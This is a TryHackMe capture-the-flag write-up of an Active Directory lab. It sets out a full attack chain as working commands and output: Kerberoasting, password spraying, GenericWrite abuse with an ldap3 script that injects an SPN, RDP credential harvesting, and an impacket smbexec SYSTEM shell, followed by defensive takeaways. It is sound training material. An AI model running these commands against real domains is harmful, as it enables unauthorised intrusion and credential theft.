CTF Write-up: Operation Endgame

PlatformTryHackMe
Category🖥️ Active Directory
DifficultyHard
TagsKerberoasting · Password Spraying · ACL Abuse · GenericWrite · Targeted Kerberoasting · Credential Harvesting · SMBExec
Target10.49.191.237 — Windows Server 2019 (Build 17763)
Domainthm.local (DC: ad.thm.local)
Result✅ Domain compromise → SYSTEM shell → Flag captured

Challenge Overview

Objective: Starting from an unauthenticated position, achieve full domain compromise on an Active Directory Domain Controller and recover the administrator flag.

This engagement demonstrates how a single enabled guest account can cascade into complete domain compromise when compounded by password reuse, overly permissive ACLs, and hardcoded credentials in automation scripts.

Attack Chain

Guest (No Creds) → Kerberoasting → CODY_ROY → Password Spray → ZACHARY_HUNT → BloodHound ACL → Targeted Kerberoast → JERRI_LANCASTER → RDP + Cred Harvest → SANFORD_DAUGHERTY → 🚩 SYSTEM

Methodology

STEP 1 Reconnaissance

A full TCP scan with service and script detection was performed against the target to enumerate the attack surface:

nmap -Pn -sC -sV -p- --min-rate 2000 10.49.191.237
  • -Pn — Skips host discovery (treats the host as online).
  • -sC — Runs Nmap's default NSE scripts for additional enumeration.
  • -sV — Probes open ports to determine running services and versions.
  • -p- — Scans all 65,535 TCP ports.
  • --min-rate 2000 — Ensures a minimum packet rate for faster scanning.

The scan revealed an extensive service profile consistent with an Active Directory Domain Controller:

  • Ports 53, 88 — DNS and Kerberos (core AD services).
  • Ports 135, 139, 445 — RPC, NetBIOS, and SMB (Windows networking stack).
  • Ports 389, 636, 3268, 3269 — LDAP, LDAPS, and Global Catalog (directory services).
  • Port 443 — IIS 10.0 serving a default page.
  • Port 3389 — RDP (Remote Desktop Protocol).

The LDAP banner disclosed the domain name thm.local, the RDP certificate confirmed the hostname AD, and SMB signing was enabled.

✓ Target confirmed as an Active Directory Domain Controller — thm.local (ad.thm.local).

STEP 2 Service Enumeration

SMB — Guest Authentication: Anonymous and guest access were tested against SMB shares:

netexec smb 10.49.191.237 -u guest -p "" --shares

Guest authentication succeeded. Only IPC$ was readable — sufficient for RPC-based enumeration but no direct file-level access was exposed.

LDAP — Anonymous Bind: Anonymous LDAP binding was permitted, enabling a full directory dump without any credentials:

ldapsearch -x -H ldap://10.49.191.237 -b "dc=thm,dc=local" \
  "(objectClass=person)" sAMAccountName

This returned approximately 600 user accounts, organised into two distinct categories:

  • Standard users — FIRSTNAME_LASTNAME naming convention (e.g., CODY_ROY, ZACHARY_HUNT).
  • Service accounts — Numeric identifiers suffixed with SA (e.g., 8429491684SA), organised within a tiered OU hierarchy (Tier 0 / Tier 1 / Tier 2), with Tier 0 representing the highest privilege level.

SPN Discovery: Querying the servicePrincipalName attribute across all user objects revealed a user-owned SPN:

CODY_ROY → HTTP/server.secure.com

A user account with a registered SPN is vulnerable to Kerberoasting — any authenticated domain principal (including guest) can request a Ticket-Granting Service (TGS) ticket encrypted with the user's password hash, which can then be cracked offline.

✓ Kerberoastable target identified — CODY_ROY with SPN HTTP/server.secure.com.

STEP 3 Initial Access — Kerberoasting

Using the guest account (no password required), I requested TGS tickets for all SPN-bearing user accounts:

impacket-GetUserSPNs thm.local/guest:'' \
  -dc-ip 10.49.191.237 -no-pass -request

The returned $krb5tgs$23$ hash for CODY_ROY was extracted and cracked against the rockyou.txt wordlist:

john cody_roy.hash --wordlist=rockyou.txt --format=krb5tgs

MKO)mko0         (?)
✓ Credential obtained — CODY_ROY : MKO)mko0 (member of Remote Desktop Users).

STEP 4 Lateral Movement — Password Spraying

To test for password reuse across the domain, I first compiled a comprehensive user list using CODY_ROY's authenticated session:

netexec ldap 10.49.191.237 -u CODY_ROY -p 'MKO)mko0' --users

The password MKO)mko0 was then sprayed against all 489 domain accounts:

netexec smb 10.49.191.237 -u users.txt -p 'MKO)mko0' \
  --continue-on-success

Two accounts authenticated successfully:

[+] thm.local\CODY_ROY:MKO)mko0
[+] thm.local\ZACHARY_HUNT:MKO)mko0
✓ Password reuse confirmed — ZACHARY_HUNT : MKO)mko0.

STEP 5 ACL Analysis — BloodHound

To map privilege-escalation paths, I collected full Active Directory graph data using ZACHARY_HUNT's credentials:

bloodhound-python -u 'ZACHARY_HUNT@thm.local' -p 'MKO)mko0' \
  -d thm.local -ns 10.49.191.237 --dns-timeout 5 -c All --zip

Parsing the BloodHound JSON output for outbound ACL edges from ZACHARY_HUNT revealed a critical privilege-escalation path:

ZACHARY_HUNT@THM.LOCAL → GenericWrite → JERRI_LANCASTER@THM.LOCAL

GenericWrite on a user object grants the ability to modify arbitrary writable attributes — including servicePrincipalName. This enables targeted Kerberoasting: an attacker can inject a fake SPN onto the victim, request a TGS ticket encrypted with their password hash, crack it offline, and then remove the SPN.

✓ Privilege escalation path identified — ZACHARY_HUNT has GenericWrite over JERRI_LANCASTER.

STEP 6 Targeted Kerberoasting via ACL Abuse

SPN Injection: Using ZACHARY_HUNT's GenericWrite permission, I injected a temporary SPN onto JERRI_LANCASTER's account via an ldap3 session:

from ldap3 import Server, Connection, MODIFY_ADD, MODIFY_DELETE

conn = Connection(
    Server("10.49.191.237"),
    user="ZACHARY_HUNT@thm.local",
    password="MKO)mko0",
    authentication="SIMPLE"
)
conn.bind()

target_dn = "CN=JERRI_LANCASTER,OU=...,DC=thm,DC=local"
conn.modify(target_dn, {
    "servicePrincipalName": [(MODIFY_ADD, ["HTTP/endgame.thm.local"])]
})

TGS Request & Offline Cracking: With the SPN now set, I requested the TGS ticket and cracked it:

impacket-GetUserSPNs 'thm.local/ZACHARY_HUNT:MKO)mko0' \
  -dc-ip 10.49.191.237 -request

This also surfaced a second Kerberoastable account — CHRISTIAN_SANFORD — with legitimate SPNs (HTTP/server.thm.local, HTTP/server.example.com). Both hashes were submitted for cracking:

john jerri_hashes.txt --wordlist=rockyou.txt --format=krb5tgs

lovinlife!       (?)  ← JERRI_LANCASTER
MKO)mko0         (?)  ← CODY_ROY (already known)

The CHRISTIAN_SANFORD hash did not crack with rockyou.txt — not needed for the attack path.

Cleanup: The temporary SPN was removed to restore the directory to its original state:

conn.modify(target_dn, {
    "servicePrincipalName": [(MODIFY_DELETE, ["HTTP/endgame.thm.local"])]
})
✓ Credential obtained — JERRI_LANCASTER : lovinlife! (Remote Desktop Users, Reader Admins).

STEP 7 RDP Access & Credential Harvesting

JERRI_LANCASTER is a member of Remote Desktop Users, providing GUI access to the domain controller:

xfreerdp /v:10.49.191.237 /u:JERRI_LANCASTER /p:'lovinlife!' \
  /cert:ignore /dynamic-resolution /size:1600x1000 \
  /drive:share,/tmp/opencode/rdp_share

Two data-exfiltration channels were established for the session:

  • Shared drive (/drive:share,...) — for bidirectional file transfer.
  • Clipboard redirection — command output piped to clip was accessible from the attacking host.

Enumeration of the C:\Scripts directory revealed an automation script containing hardcoded domain credentials:

# C:\Scripts\syncer.ps1
$Username = "SANFORD_DAUGHERTY"
$Password = ConvertTo-SecureString "RESET_ASAP123" -AsPlainText -Force
✓ Plaintext credentials harvested from syncer.ps1 — SANFORD_DAUGHERTY : RESET_ASAP123.

STEP 8 Privilege Escalation — SYSTEM

The harvested credentials were validated against SMB:

netexec smb 10.49.191.237 -u 'SANFORD_DAUGHERTY' -p 'RESET_ASAP123'

[+] thm.local\SANFORD_DAUGHERTY:RESET_ASAP123 (Pwn3d!)

The (Pwn3d!) indicator confirmed local administrator privileges, with READ and WRITE access to C$ and ADMIN$ administrative shares.

A SYSTEM-level shell was obtained via Impacket's smbexec, which leverages the Windows Service Control Manager for code execution:

impacket-smbexec 'THM.LOCAL/SANFORD_DAUGHERTY:RESET_ASAP123@10.49.191.237'

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> type C:\Users\Administrator\Desktop\flag.txt.txt
THM{INFILTRATION_COMPLETE_OUR_COMMAND_OVER_NETWORK_ASSERTS}
FLAG
🚩 THM{INFILTRATION_COMPLETE_OUR_COMMAND_OVER_NETWORK_ASSERTS}

Key Takeaways

🔓 Disable Guest-Account Kerberos Authentication

The guest account — requiring no password — was sufficient to request TGS tickets and Kerberoast user-owned SPNs. Guest accounts should be disabled entirely or, at minimum, restricted from Kerberos authentication via Group Policy. This single misconfiguration provided the initial foothold for the entire attack chain.

🔑 Enforce Unique Passwords and Deploy MFA

Password reuse between CODY_ROY and ZACHARY_HUNT enabled lateral movement from a single cracked hash to a second account with elevated ACL permissions. Unique password enforcement, a banned-password list blocking common patterns, and Multi-Factor Authentication would have contained the blast radius of the initial compromise.

🛡️ Audit and Trim Excessive ACL Permissions

GenericWrite on a user object enabled targeted Kerberoasting — the ability to inject an SPN, request a TGS, and crack the password offline. DACLs should be audited regularly using tools like BloodHound or PingCastle, and SPN modifications should be monitored via Windows Event ID 4742 (computer account modification) and custom detections on attribute changes.

📜 Never Store Credentials in Automation Scripts

The syncer.ps1 script contained plaintext domain credentials for a local administrator account. Any user with read access to C:\Scripts could harvest them. Secrets should be managed through a dedicated vault (Azure Key Vault, HashiCorp Vault) or Group Managed Service Accounts (gMSA), which eliminate the need for password storage entirely.

📂 Restrict Anonymous LDAP Binding

Anonymous LDAP access enabled full directory enumeration — including user accounts, group memberships, and SPNs — without any credentials. Anonymous binding should be disabled via the dsHeuristics attribute, and LDAP signing and channel binding should be enforced to prevent unauthenticated reconnaissance.

🔐 Enforce Strong Password Policies

Both Kerberoasted passwords (MKO)mko0 and lovinlife!) cracked in seconds against the standard rockyou.txt wordlist. A minimum password length of 14+ characters, combined with a password filter blocking common dictionary words, would have rendered the Kerberoasting attacks ineffective even if the TGS tickets were successfully obtained.
